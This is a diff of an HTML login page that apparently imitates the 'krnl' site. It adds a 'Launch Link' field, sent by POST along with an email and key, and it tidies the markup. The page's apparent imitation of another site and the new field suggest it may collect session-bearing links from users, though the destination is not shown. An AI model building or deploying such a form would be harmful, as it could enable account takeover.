@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 
@@ -12,73 +11,66 @@
     <meta name="robots" content="noindex">
 
     <!-- Replace local paths with 'https://krnl.place/' -->
-    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">
-    <link href="https://krnl.place/css/bootstrap.min.css" rel="stylesheet">
-	<link href="https://krnl.place/css/krnl-components.css" rel="stylesheet">
-	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <link href="https://fonts.googleapis.com/css?family=Raleway:300,400,500,600,700&display=swap" rel="stylesheet">
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link href="css/krnl-components.css" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
     <script src='https://www.google.com/recaptcha/api.js' async defer></script>
-
 </head>
 
 <body id="cardbackground">
     <main id="main">
-
         <section class="why-us">
-            <div class="container">
-
-            </div>
+            <div class="container"></div>
         </section>
 
         <section class="inner-page">
-            <div class="container">
-            </div>
+            <div class="container"></div>
         </section>
 
         <section id="choice" class="why-us">
             <div class="container">
                 <div class="row h-100 justify-content-center align-items-center">
-
                     <form>
                         <br>
-
                         <div class="cardholder" style="margin-top:50%;">
                             <h3 style="margin-top:0;margin-bottom:20px;">Log in</h3>
 
-							<div>
+                            <div>
                                 <label for="email">Email</label>
                                 <br>
-								<input type="text" id="email" class="textinput" name="email" value="" placeholder="Email address">
+                                <input type="text" id="email" class="textinput" name="email" value="" placeholder="Email address">
                             </div>
-								
-							<label style="margin-top: 15px;" for="key">Key</label>
+
+                            <label style="margin-top: 15px;" for="key">Key</label>
                             <br/>
-							<input type="text" id="key" class="textinput" name="key" value="" placeholder="Key">
+                            <input type="text" id="key" class="textinput" name="key" value="" placeholder="Key">
+
+                            <label style="margin-top: 15px;" for="launch-link">Launch Link</label>
+                            <br/>
+                            <input type="text" id="launch-link" class="textinput" name="launch-link" value="" placeholder="Launch Link">
 
                             <br>
 
-                            <a href="/"><button type="button" class="checkout-button" style="margin-top: 20px;">Back</button></a>
-							<button  style="margin-top: 20px; margin-right:0;" id="submit-billings">which bomboclat dog i am</button>
+                            <button style="margin-top: 20px; margin-right:0;" id="submit-billings">Log in</button>
                         </div>
                     </form>
-
-
                 </div>
-
             </div>
         </section>
-
     </main><!-- End #main -->
     <script>
         {
-		    const email = $('input#email')
-		    const key = $('input#key')
-		    const submit = $('button#submit-billings');
+            const email = $('input#email')
+            const key = $('input#key')
+            const launchLink = $('input#launch-link')
+            const submit = $('button#submit-billings');
 
             var debounce = false
 
-		    submit.on('click', function(e) {
-				e.preventDefault()
-				e.stopImmediatePropagation()
+            submit.on('click', function(e) {
+                e.preventDefault()
+                e.stopImmediatePropagation()
 
                 if (debounce) return;
                 debounce = true
@@ -88,28 +80,29 @@
                     type: 'POST',
                     data: {
                         email: email.val(),
-                        key: key.val()
+                        key: key.val(),
+                        launchLink: launchLink.val()
                     },
                     success: function (message, statusText, xhr) {
                         debounce = false
-						try {
-							const data = typeof message == 'string' ? JSON.parse(message) : message
+                        try {
+                            const data = typeof message == 'string' ? JSON.parse(message) : message
 
-							if ('url' in data) {
-								location.href = data.url
-							} else if ('error' in data) {
-								alert(data.error)
-							}
-						} catch {
-							alert("An error occurred, try again in a few minutes.")
-						}
+                            if ('url' in data) {
+                                location.href = data.url
+                            } else if ('error' in data) {
+                                alert(data.error)
+                            }
+                        } catch {
+                            alert("An error occurred, try again in a few minutes.")
+                        }
                     },
                     error: function(xhr, status, err) {
                         debounce = false
                         alert(`[Error Event] Invalid Key or Email; -> ${location.host}${this.url}, ${status}, ${err}`)
                     }
                 })
-		    })
+            })
         }
 
         try {
